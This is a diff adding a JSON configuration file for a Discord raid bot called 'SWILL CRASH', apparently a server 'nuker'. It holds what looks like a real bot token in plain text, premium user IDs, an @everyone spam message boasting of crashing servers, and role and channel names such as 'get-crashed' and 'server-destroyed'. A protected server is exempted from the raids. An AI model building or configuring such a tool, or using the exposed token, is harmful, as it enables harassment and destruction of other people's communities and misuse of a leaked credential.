@@ -1,0 +1,27 @@
+{
+    "token": "MTQ2NzQ3MTM0MDgwMDgzNTc4NA.Gd86Ny.1KNniCEQkit0biA8yxK5vkYrp4nj8elqVQ229k",
+    "bot_invite_link": "https://discord.gg/yMcxvVcxP5",
+    "bot_name": "SWILL CRASH",
+    "premium_users": [
+        "909100136074993694",
+        "1097047579876929616"
+    ],
+    "help_image_url": "https://example.com/help_image.png",
+    "default_spam_message": "@everyone SERVER CRASHED BY SWILL BOT | СЕРВЕР КРАНШУТ С ПОМОЩЬЮ SWILL BOT | CRASH | SWILL ",
+    "default_role_name": "SWILL CRASHED",
+    "default_channel_names": [
+        "swill-crash",
+        "get-crashed",
+        "server-destroyed"
+    ],
+    "protected_server_id": "1469689803627958274",
+    "log_channel_id": "1469689805905465362",
+    "ignored_channels": [
+        "1469690401664405671",
+        "1469690447533441117",
+        "1469689805905465360",
+        "1469689805905465361",
+        "1469689805905465362",
+        "1469689805905465363"
+    ]
+}
